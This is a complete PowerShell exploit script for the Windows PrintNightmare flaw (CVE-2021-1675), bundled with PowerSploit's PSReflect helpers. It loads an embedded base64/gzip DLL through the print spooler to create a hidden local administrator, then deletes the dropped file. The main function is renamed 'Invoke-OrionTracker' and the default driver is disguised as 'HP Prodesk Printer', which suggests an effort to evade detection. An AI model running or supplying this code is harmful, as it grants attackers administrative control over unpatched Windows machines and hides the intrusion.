function Invoke-OrionTracker
{
    <#
        .SYNOPSIS
        Exploits CVE-2021-1675 (PrintNightmare)

        Authors:
            Caleb Stewart - https://github.com/calebstewart
            John Hammond - https://github.com/JohnHammond
        URL: https://github.com/calebstewart/CVE-2021-1675

        .DESCRIPTION
        Exploits CVE-2021-1675 (PrintNightmare) locally to add a new local administrator
        user with a known password. Optionally, this can be used to execute your own
        custom DLL to execute any other code as NT AUTHORITY\SYSTEM.

        .PARAMETER DriverName
        The name of the new printer driver to add (default: "Totally Not Malicious")

        .PARAMETER NewUser
        The name of the new user to create when using the default DLL (default: "adm1n")

        .PARAMETER NewPassword
        The password for the new user when using the default DLL (default: "P@ssw0rd")

        .PARAMETER DLL
        The DLL to execute when loading the printer driver (default: a builtin payload which
        creates the specified user, and adds the new user to the local administrators group).

        .EXAMPLE
        > Invoke-Nightmare
        Adds a new local user named `adm1n` which is a member of the local admins group

        .EXAMPLE
        > Invoke-Nightmare -NewUser "caleb" -NewPassword "password" -DriverName "driver"
        Adds a new local user named `caleb` using a printer driver named `driver`

        .EXAMPLE
        > Invoke-Nightmare -DLL C:\path\to\

    #>
    param (
        [string]$DriverName = "HP Prodesk Printer",
        [string]$NewUser = "",
        [string]$NewPassword = "",
        [string]$DLL = ""
    )

    if ( $DLL -eq "" ){
        $nightmare_data = [byte[]](get_nightmare_dll)
        $encoder = New-Object System.Text.UnicodeEncoding

        if ( $NewUser -ne "" ) {
            $NewUserBytes = $encoder.GetBytes($NewUser)
            [System.Buffer]::BlockCopy($NewUserBytes, 0, $nightmare_data, 0x32e20, $NewUserBytes.Length)
            $nightmare_data[0x32e20+$NewUserBytes.Length] = 0
            $nightmare_data[0x32e20+$NewUserBytes.Length+1] = 0
        } else {
            Write-Host "[+] using default new user: adm1n"
        }

        if ( $NewPassword -ne "" ) {
            $NewPasswordBytes = $encoder.GetBytes($NewPassword)
            [System.Buffer]::BlockCopy($NewPasswordBytes, 0, $nightmare_data, 0x32c20, $NewPasswordBytes.Length)
            $nightmare_data[0x32c20+$NewPasswordBytes.Length] = 0
            $nightmare_data[0x32c20+$NewPasswordBytes.Length+1] = 0
        } else {
            Write-Host "[+] using default new password: P@ssw0rd"
        }

        $DLL = [System.IO.Path]::GetTempPath() + "hp0343fdsdf.dll"
        [System.IO.File]::WriteAllBytes($DLL, $nightmare_data)
        Write-Host "[+] created payload at $DLL"
        $delete_me = $true
    } else {
        Write-Host "[+] using user-supplied payload at $DLL"
        Write-Host "[!] ignoring NewUser and NewPassword arguments"
        $delete_me = $false
    }

    $Mod = New-InMemoryModule -ModuleName "A$(Get-Random)"

    $FunctionDefinitions = @(
      (func winspool.drv AddPrinterDriverEx ([bool]) @([string], [Uint32], [IntPtr], [Uint32]) -Charset Auto -SetLastError),
      (func winspool.drv EnumPrinterDrivers([bool]) @( [string], [string], [Uint32], [IntPtr], [UInt32], [Uint32].MakeByRefType(), [Uint32].MakeByRefType()) -Charset Auto -SetLastError)
    )

    $Types = $FunctionDefinitions | Add-Win32Type -Module $Mod -Namespace 'Mod'

    # Define custom structures for types created
    $DRIVER_INFO_2 = struct $Mod DRIVER_INFO_2 @{
        cVersion = field 0 Uint64;
        pName = field 1 string -MarshalAs @("LPTStr");
        pEnvironment = field 2 string -MarshalAs @("LPTStr");
        pDriverPath = field 3 string -MarshalAs @("LPTStr");
        pDataFile = field 4 string -MarshalAs @("LPTStr");
        pConfigFile = field 5 string -MarshalAs @("LPTStr");
    }

    $winspool = $Types['winspool.drv']
    $APD_COPY_ALL_FILES = 0x00000004

    [Uint32]($cbNeeded) = 0
    [Uint32]($cReturned) = 0

    if ( $winspool::EnumPrinterDrivers($null, "Windows x64", 2, [IntPtr]::Zero, 0, [ref]$cbNeeded, [ref]$cReturned) ){
        Write-Host "[!] EnumPrinterDrivers should fail!"
        return
    }

    [IntPtr]$pAddr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal([Uint32]($cbNeeded))

    if ( $winspool::EnumPrinterDrivers($null, "Windows x64", 2, $pAddr, $cbNeeded, [ref]$cbNeeded, [ref]$cReturned) ){
        $driver = [System.Runtime.InteropServices.Marshal]::PtrToStructure($pAddr, [System.Type]$DRIVER_INFO_2)
    } else {
        Write-Host "[!] failed to get current driver list"
        [System.Runtime.InteropServices.Marshal]::FreeHGlobal($pAddr)
        return
    }

    Write-Host "[+] using pDriverPath = `"$($driver.pDriverPath)`""
    [System.Runtime.InteropServices.Marshal]::FreeHGlobal($pAddr)

    $driver_info = New-Object $DRIVER_INFO_2
    $driver_info.cVersion = 3
    $driver_info.pConfigFile = $DLL
    $driver_info.pDataFile = $DLL
    $driver_info.pDriverPath = $driver.pDriverPath
    $driver_info.pEnvironment = "Windows x64"
    $driver_info.pName = $DriverName

    $pDriverInfo = [System.Runtime.InteropServices.Marshal]::AllocHGlobal([System.Runtime.InteropServices.Marshal]::SizeOf($driver_info))
    [System.Runtime.InteropServices.Marshal]::StructureToPtr($driver_info, $pDriverInfo, $false)

    if ( $winspool::AddPrinterDriverEx($null, 2, $pDriverInfo, $APD_COPY_ALL_FILES -bor 0x10 -bor 0x8000) ) {
        if ( $delete_me ) {
            Write-Host "[+] added user $NewUser as local administrator"
        } else {
            Write-Host "[+] driver appears to have been loaded!"
        }
    } else {
        Write-Error "[!] AddPrinterDriverEx failed"
    }

    if ( $delete_me ) {
        Write-Host "[+] deleting payload from $DLL"
        Remove-Item -Force $DLL
    }
}

function get_nightmare_dll
{
    $nightmare_data = [System.Convert]::FromBase64String("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")
    $nightmare_ms = New-Object System.IO.MemoryStream -ArgumentList @(,$nightmare_data)
    $ms = New-Object System.IO.MemoryStream
    $gzs = New-Object System.IO.Compression.GZipStream -ArgumentList @($nightmare_ms, [System.IO.Compression.CompressionMode]::Decompress)
    $gzs.CopyTo($ms)
    $gzs.Close()
    $nightmare_ms.Close()

    return $ms.ToArray()
}

########################################################
# Stolen from PowerSploit: https://github.com/PowerShellMafia/PowerSploit
########################################################

########################################################
#
# PSReflect code for Windows API access
# Author: @mattifestation
#   https://raw.githubusercontent.com/mattifestation/PSReflect/master/PSReflect.psm1
#
########################################################

function New-InMemoryModule {
<#
.SYNOPSIS
Creates an in-memory assembly and module
Author: Matthew Graeber (@mattifestation)
License: BSD 3-Clause
Required Dependencies: None
Optional Dependencies: None
.DESCRIPTION
When defining custom enums, structs, and unmanaged functions, it is
necessary to associate to an assembly module. This helper function
creates an in-memory module that can be passed to the 'enum',
'struct', and Add-Win32Type functions.
.PARAMETER ModuleName
Specifies the desired name for the in-memory assembly and module. If
ModuleName is not provided, it will default to a GUID.
.EXAMPLE
$Module = New-InMemoryModule -ModuleName Win32
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0)]
        [ValidateNotNullOrEmpty()]
        [String]
        $ModuleName = [Guid]::NewGuid().ToString()
    )

    $AppDomain = [Reflection.Assembly].Assembly.GetType('System.AppDomain').GetProperty('CurrentDomain').GetValue($null, @())
    $LoadedAssemblies = $AppDomain.GetAssemblies()

    foreach ($Assembly in $LoadedAssemblies) {
        if ($Assembly.FullName -and ($Assembly.FullName.Split(',')[0] -eq $ModuleName)) {
            return $Assembly
        }
    }

    $DynAssembly = New-Object Reflection.AssemblyName($ModuleName)
    $Domain = $AppDomain
    $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly, 'Run')
    $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule($ModuleName, $False)

    return $ModuleBuilder
}

# A helper function used to reduce typing while defining function
# prototypes for Add-Win32Type.
function func {
    Param (
        [Parameter(Position = 0, Mandatory = $True)]
        [String]
        $DllName,

        [Parameter(Position = 1, Mandatory = $True)]
        [string]
        $FunctionName,

        [Parameter(Position = 2, Mandatory = $True)]
        [Type]
        $ReturnType,

        [Parameter(Position = 3)]
        [Type[]]
        $ParameterTypes,

        [Parameter(Position = 4)]
        [Runtime.InteropServices.CallingConvention]
        $NativeCallingConvention,

        [Parameter(Position = 5)]
        [Runtime.InteropServices.CharSet]
        $Charset,

        [String]
        $EntryPoint,

        [Switch]
        $SetLastError
    )

    $Properties = @{
        DllName = $DllName
        FunctionName = $FunctionName
        ReturnType = $ReturnType
    }

    if ($ParameterTypes) { $Properties['ParameterTypes'] = $ParameterTypes }
    if ($NativeCallingConvention) { $Properties['NativeCallingConvention'] = $NativeCallingConvention }
    if ($Charset) { $Properties['Charset'] = $Charset }
    if ($SetLastError) { $Properties['SetLastError'] = $SetLastError }
    if ($EntryPoint) { $Properties['EntryPoint'] = $EntryPoint }

    New-Object PSObject -Property $Properties
}

function Add-Win32Type
{
<#
.SYNOPSIS
Creates a .NET type for an unmanaged Win32 function.
Author: Matthew Graeber (@mattifestation)
License: BSD 3-Clause
Required Dependencies: None
Optional Dependencies: func
.DESCRIPTION
Add-Win32Type enables you to easily interact with unmanaged (i.e.
Win32 unmanaged) functions in PowerShell. After providing
Add-Win32Type with a function signature, a .NET type is created
using reflection (i.e. csc.exe is never called like with Add-Type).
The 'func' helper function can be used to reduce typing when defining
multiple function definitions.
.PARAMETER DllName
The name of the DLL.
.PARAMETER FunctionName
The name of the target function.
.PARAMETER EntryPoint
The DLL export function name. This argument should be specified if the
specified function name is different than the name of the exported
function.
.PARAMETER ReturnType
The return type of the function.
.PARAMETER ParameterTypes
The function parameters.
.PARAMETER NativeCallingConvention
Specifies the native calling convention of the function. Defaults to
stdcall.
.PARAMETER Charset
If you need to explicitly call an 'A' or 'W' Win32 function, you can
specify the character set.
.PARAMETER SetLastError
Indicates whether the callee calls the SetLastError Win32 API
function before returning from the attributed method.
.PARAMETER Module
The in-memory module that will host the functions. Use
New-InMemoryModule to define an in-memory module.
.PARAMETER Namespace
An optional namespace to prepend to the type. Add-Win32Type defaults
to a namespace consisting only of the name of the DLL.
.EXAMPLE
$Mod = New-InMemoryModule -ModuleName Win32
$FunctionDefinitions = @(
  (func kernel32 GetProcAddress ([IntPtr]) @([IntPtr], [String]) -Charset Ansi -SetLastError),
  (func kernel32 GetModuleHandle ([Intptr]) @([String]) -SetLastError),
  (func ntdll RtlGetCurrentPeb ([IntPtr]) @())
)
$Types = $FunctionDefinitions | Add-Win32Type -Module $Mod -Namespace 'Win32'
$Kernel32 = $Types['kernel32']
$Ntdll = $Types['ntdll']
$Ntdll::RtlGetCurrentPeb()
$ntdllbase = $Kernel32::GetModuleHandle('ntdll')
$Kernel32::GetProcAddress($ntdllbase, 'RtlGetCurrentPeb')
.NOTES
Inspired by Lee Holmes' Invoke-WindowsApi http://poshcode.org/2189
When defining multiple function prototypes, it is ideal to provide
Add-Win32Type with an array of function signatures. That way, they
are all incorporated into the same in-memory module.
#>

    [OutputType([Hashtable])]
    Param(
        [Parameter(Mandatory=$True, ValueFromPipelineByPropertyName=$True)]
        [String]
        $DllName,

        [Parameter(Mandatory=$True, ValueFromPipelineByPropertyName=$True)]
        [String]
        $FunctionName,

        [Parameter(ValueFromPipelineByPropertyName=$True)]
        [String]
        $EntryPoint,

        [Parameter(Mandatory=$True, ValueFromPipelineByPropertyName=$True)]
        [Type]
        $ReturnType,

        [Parameter(ValueFromPipelineByPropertyName=$True)]
        [Type[]]
        $ParameterTypes,

        [Parameter(ValueFromPipelineByPropertyName=$True)]
        [Runtime.InteropServices.CallingConvention]
        $NativeCallingConvention = [Runtime.InteropServices.CallingConvention]::StdCall,

        [Parameter(ValueFromPipelineByPropertyName=$True)]
        [Runtime.InteropServices.CharSet]
        $Charset = [Runtime.InteropServices.CharSet]::Auto,

        [Parameter(ValueFromPipelineByPropertyName=$True)]
        [Switch]
        $SetLastError,

        [Parameter(Mandatory=$True)]
        [ValidateScript({($_ -is [Reflection.Emit.ModuleBuilder]) -or ($_ -is [Reflection.Assembly])})]
        $Module,

        [ValidateNotNull()]
        [String]
        $Namespace = ''
    )

    BEGIN
    {
        $TypeHash = @{}
    }

    PROCESS
    {
        if ($Module -is [Reflection.Assembly])
        {
            if ($Namespace)
            {
                $TypeHash[$DllName] = $Module.GetType("$Namespace.$DllName")
            }
            else
            {
                $TypeHash[$DllName] = $Module.GetType($DllName)
            }
        }
        else
        {
            # Define one type for each DLL
            if (!$TypeHash.ContainsKey($DllName))
            {
                if ($Namespace)
                {
                    $TypeHash[$DllName] = $Module.DefineType("$Namespace.$DllName", 'Public,BeforeFieldInit')
                }
                else
                {
                    $TypeHash[$DllName] = $Module.DefineType($DllName, 'Public,BeforeFieldInit')
                }
            }

            $Method = $TypeHash[$DllName].DefineMethod(
                $FunctionName,
                'Public,Static,PinvokeImpl',
                $ReturnType,
                $ParameterTypes)

            # Make each ByRef parameter an Out parameter
            $i = 1
            foreach($Parameter in $ParameterTypes)
            {
                if ($Parameter.IsByRef)
                {
                    [void] $Method.DefineParameter($i, 'Out', $null)
                }

                $i++
            }

            $DllImport = [Runtime.InteropServices.DllImportAttribute]
            $SetLastErrorField = $DllImport.GetField('SetLastError')
            $CallingConventionField = $DllImport.GetField('CallingConvention')
            $CharsetField = $DllImport.GetField('CharSet')
            $EntryPointField = $DllImport.GetField('EntryPoint')
            if ($SetLastError) { $SLEValue = $True } else { $SLEValue = $False }

            if ($PSBoundParameters['EntryPoint']) { $ExportedFuncName = $EntryPoint } else { $ExportedFuncName = $FunctionName }

            # Equivalent to C# version of [DllImport(DllName)]
            $Constructor = [Runtime.InteropServices.DllImportAttribute].GetConstructor([String])
            $DllImportAttribute = New-Object Reflection.Emit.CustomAttributeBuilder($Constructor,
                $DllName, [Reflection.PropertyInfo[]] @(), [Object[]] @(),
                [Reflection.FieldInfo[]] @($SetLastErrorField,
                                           $CallingConventionField,
                                           $CharsetField,
                                           $EntryPointField),
                [Object[]] @($SLEValue,
                             ([Runtime.InteropServices.CallingConvention] $NativeCallingConvention),
                             ([Runtime.InteropServices.CharSet] $Charset),
                             $ExportedFuncName))

            $Method.SetCustomAttribute($DllImportAttribute)
        }
    }

    END
    {
        if ($Module -is [Reflection.Assembly])
        {
            return $TypeHash
        }

        $ReturnTypes = @{}

        foreach ($Key in $TypeHash.Keys)
        {
            $Type = $TypeHash[$Key].CreateType()

            $ReturnTypes[$Key] = $Type
        }

        return $ReturnTypes
    }
}


function psenum {
<#
.SYNOPSIS
Creates an in-memory enumeration for use in your PowerShell session.
Author: Matthew Graeber (@mattifestation)
License: BSD 3-Clause
Required Dependencies: None
Optional Dependencies: None
.DESCRIPTION
The 'psenum' function facilitates the creation of enums entirely in
memory using as close to a "C style" as PowerShell will allow.
.PARAMETER Module
The in-memory module that will host the enum. Use
New-InMemoryModule to define an in-memory module.
.PARAMETER FullName
The fully-qualified name of the enum.
.PARAMETER Type
The type of each enum element.
.PARAMETER EnumElements
A hashtable of enum elements.
.PARAMETER Bitfield
Specifies that the enum should be treated as a bitfield.
.EXAMPLE
$Mod = New-InMemoryModule -ModuleName Win32
$ImageSubsystem = psenum $Mod PE.IMAGE_SUBSYSTEM UInt16 @{
    UNKNOWN =                  0
    NATIVE =                   1 # Image doesn't require a subsystem.
    WINDOWS_GUI =              2 # Image runs in the Windows GUI subsystem.
    WINDOWS_CUI =              3 # Image runs in the Windows character subsystem.
    OS2_CUI =                  5 # Image runs in the OS/2 character subsystem.
    POSIX_CUI =                7 # Image runs in the Posix character subsystem.
    NATIVE_WINDOWS =           8 # Image is a native Win9x driver.
    WINDOWS_CE_GUI =           9 # Image runs in the Windows CE subsystem.
    EFI_APPLICATION =          10
    EFI_BOOT_SERVICE_DRIVER =  11
    EFI_RUNTIME_DRIVER =       12
    EFI_ROM =                  13
    XBOX =                     14
    WINDOWS_BOOT_APPLICATION = 16
}
.NOTES
PowerShell purists may disagree with the naming of this function but
again, this was developed in such a way so as to emulate a "C style"
definition as closely as possible. Sorry, I'm not going to name it
New-Enum. :P
#>

    [OutputType([Type])]
    Param (
        [Parameter(Position = 0, Mandatory=$True)]
        [ValidateScript({($_ -is [Reflection.Emit.ModuleBuilder]) -or ($_ -is [Reflection.Assembly])})]
        $Module,

        [Parameter(Position = 1, Mandatory=$True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $FullName,

        [Parameter(Position = 2, Mandatory=$True)]
        [Type]
        $Type,

        [Parameter(Position = 3, Mandatory=$True)]
        [ValidateNotNullOrEmpty()]
        [Hashtable]
        $EnumElements,

        [Switch]
        $Bitfield
    )

    if ($Module -is [Reflection.Assembly])
    {
        return ($Module.GetType($FullName))
    }

    $EnumType = $Type -as [Type]

    $EnumBuilder = $Module.DefineEnum($FullName, 'Public', $EnumType)

    if ($Bitfield)
    {
        $FlagsConstructor = [FlagsAttribute].GetConstructor(@())
        $FlagsCustomAttribute = New-Object Reflection.Emit.CustomAttributeBuilder($FlagsConstructor, @())
        $EnumBuilder.SetCustomAttribute($FlagsCustomAttribute)
    }

    foreach ($Key in $EnumElements.Keys)
    {
        # Apply the specified enum type to each element
        $null = $EnumBuilder.DefineLiteral($Key, $EnumElements[$Key] -as $EnumType)
    }

    $EnumBuilder.CreateType()
}


# A helper function used to reduce typing while defining struct
# fields.
function field {
    Param (
        [Parameter(Position = 0, Mandatory=$True)]
        [UInt16]
        $Position,

        [Parameter(Position = 1, Mandatory=$True)]
        [Type]
        $Type,

        [Parameter(Position = 2)]
        [UInt16]
        $Offset,

        [Object[]]
        $MarshalAs
    )

    @{
        Position = $Position
        Type = $Type -as [Type]
        Offset = $Offset
        MarshalAs = $MarshalAs
    }
}


function struct
{
<#
.SYNOPSIS
Creates an in-memory struct for use in your PowerShell session.
Author: Matthew Graeber (@mattifestation)
License: BSD 3-Clause
Required Dependencies: None
Optional Dependencies: field
.DESCRIPTION
The 'struct' function facilitates the creation of structs entirely in
memory using as close to a "C style" as PowerShell will allow. Struct
fields are specified using a hashtable where each field of the struct
is comprosed of the order in which it should be defined, its .NET
type, and optionally, its offset and special marshaling attributes.
One of the features of 'struct' is that after your struct is defined,
it will come with a built-in GetSize method as well as an explicit
converter so that you can easily cast an IntPtr to the struct without
relying upon calling SizeOf and/or PtrToStructure in the Marshal
class.
.PARAMETER Module
The in-memory module that will host the struct. Use
New-InMemoryModule to define an in-memory module.
.PARAMETER FullName
The fully-qualified name of the struct.
.PARAMETER StructFields
A hashtable of fields. Use the 'field' helper function to ease
defining each field.
.PARAMETER PackingSize
Specifies the memory alignment of fields.
.PARAMETER ExplicitLayout
Indicates that an explicit offset for each field will be specified.
.EXAMPLE
$Mod = New-InMemoryModule -ModuleName Win32
$ImageDosSignature = psenum $Mod PE.IMAGE_DOS_SIGNATURE UInt16 @{
    DOS_SIGNATURE =    0x5A4D
    OS2_SIGNATURE =    0x454E
    OS2_SIGNATURE_LE = 0x454C
    VXD_SIGNATURE =    0x454C
}
$ImageDosHeader = struct $Mod PE.IMAGE_DOS_HEADER @{
    e_magic =    field 0 $ImageDosSignature
    e_cblp =     field 1 UInt16
    e_cp =       field 2 UInt16
    e_crlc =     field 3 UInt16
    e_cparhdr =  field 4 UInt16
    e_minalloc = field 5 UInt16
    e_maxalloc = field 6 UInt16
    e_ss =       field 7 UInt16
    e_sp =       field 8 UInt16
    e_csum =     field 9 UInt16
    e_ip =       field 10 UInt16
    e_cs =       field 11 UInt16
    e_lfarlc =   field 12 UInt16
    e_ovno =     field 13 UInt16
    e_res =      field 14 UInt16[] -MarshalAs @('ByValArray', 4)
    e_oemid =    field 15 UInt16
    e_oeminfo =  field 16 UInt16
    e_res2 =     field 17 UInt16[] -MarshalAs @('ByValArray', 10)
    e_lfanew =   field 18 Int32
}
# Example of using an explicit layout in order to create a union.
$TestUnion = struct $Mod TestUnion @{
    field1 = field 0 UInt32 0
    field2 = field 1 IntPtr 0
} -ExplicitLayout
.NOTES
PowerShell purists may disagree with the naming of this function but
again, this was developed in such a way so as to emulate a "C style"
definition as closely as possible. Sorry, I'm not going to name it
New-Struct. :P
#>

    [OutputType([Type])]
    Param (
        [Parameter(Position = 1, Mandatory=$True)]
        [ValidateScript({($_ -is [Reflection.Emit.ModuleBuilder]) -or ($_ -is [Reflection.Assembly])})]
        $Module,

        [Parameter(Position = 2, Mandatory=$True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $FullName,

        [Parameter(Position = 3, Mandatory=$True)]
        [ValidateNotNullOrEmpty()]
        [Hashtable]
        $StructFields,

        [Reflection.Emit.PackingSize]
        $PackingSize = [Reflection.Emit.PackingSize]::Unspecified,

        [Switch]
        $ExplicitLayout
    )

    if ($Module -is [Reflection.Assembly])
    {
        return ($Module.GetType($FullName))
    }

    [Reflection.TypeAttributes] $StructAttributes = 'AnsiClass,
        Class,
        Public,
        Sealed,
        BeforeFieldInit'

    if ($ExplicitLayout)
    {
        $StructAttributes = $StructAttributes -bor [Reflection.TypeAttributes]::ExplicitLayout
    }
    else
    {
        $StructAttributes = $StructAttributes -bor [Reflection.TypeAttributes]::SequentialLayout
    }

    $StructBuilder = $Module.DefineType($FullName, $StructAttributes, [ValueType], $PackingSize)
    $ConstructorInfo = [Runtime.InteropServices.MarshalAsAttribute].GetConstructors()[0]
    $SizeConst = @([Runtime.InteropServices.MarshalAsAttribute].GetField('SizeConst'))

    $Fields = New-Object Hashtable[]($StructFields.Count)

    # Sort each field according to the orders specified
    # Unfortunately, PSv2 doesn't have the luxury of the
    # hashtable [Ordered] accelerator.
    foreach ($Field in $StructFields.Keys)
    {
        $Index = $StructFields[$Field]['Position']
        $Fields[$Index] = @{FieldName = $Field; Properties = $StructFields[$Field]}
    }

    foreach ($Field in $Fields)
    {
        $FieldName = $Field['FieldName']
        $FieldProp = $Field['Properties']

        $Offset = $FieldProp['Offset']
        $Type = $FieldProp['Type']
        $MarshalAs = $FieldProp['MarshalAs']

        $NewField = $StructBuilder.DefineField($FieldName, $Type, 'Public')

        if ($MarshalAs)
        {
            $UnmanagedType = $MarshalAs[0] -as ([Runtime.InteropServices.UnmanagedType])
            if ($MarshalAs[1])
            {
                $Size = $MarshalAs[1]
                $AttribBuilder = New-Object Reflection.Emit.CustomAttributeBuilder($ConstructorInfo,
                    $UnmanagedType, $SizeConst, @($Size))
            }
            else
            {
                $AttribBuilder = New-Object Reflection.Emit.CustomAttributeBuilder($ConstructorInfo, [Object[]] @($UnmanagedType))
            }

            $NewField.SetCustomAttribute($AttribBuilder)
        }

        if ($ExplicitLayout) { $NewField.SetOffset($Offset) }
    }

    # Make the struct aware of its own size.
    # No more having to call [Runtime.InteropServices.Marshal]::SizeOf!
    $SizeMethod = $StructBuilder.DefineMethod('GetSize',
        'Public, Static',
        [Int],
        [Type[]] @())
    $ILGenerator = $SizeMethod.GetILGenerator()
    # Thanks for the help, Jason Shirk!
    $ILGenerator.Emit([Reflection.Emit.OpCodes]::Ldtoken, $StructBuilder)
    $ILGenerator.Emit([Reflection.Emit.OpCodes]::Call,
        [Type].GetMethod('GetTypeFromHandle'))
    $ILGenerator.Emit([Reflection.Emit.OpCodes]::Call,
        [Runtime.InteropServices.Marshal].GetMethod('SizeOf', [Type[]] @([Type])))
    $ILGenerator.Emit([Reflection.Emit.OpCodes]::Ret)

    # Allow for explicit casting from an IntPtr
    # No more having to call [Runtime.InteropServices.Marshal]::PtrToStructure!
    $ImplicitConverter = $StructBuilder.DefineMethod('op_Implicit',
        'PrivateScope, Public, Static, HideBySig, SpecialName',
        $StructBuilder,
        [Type[]] @([IntPtr]))
    $ILGenerator2 = $ImplicitConverter.GetILGenerator()
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Nop)
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Ldarg_0)
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Ldtoken, $StructBuilder)
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Call,
        [Type].GetMethod('GetTypeFromHandle'))
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Call,
        [Runtime.InteropServices.Marshal].GetMethod('PtrToStructure', [Type[]] @([IntPtr], [Type])))
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Unbox_Any, $StructBuilder)
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Ret)

    $StructBuilder.CreateType()
}
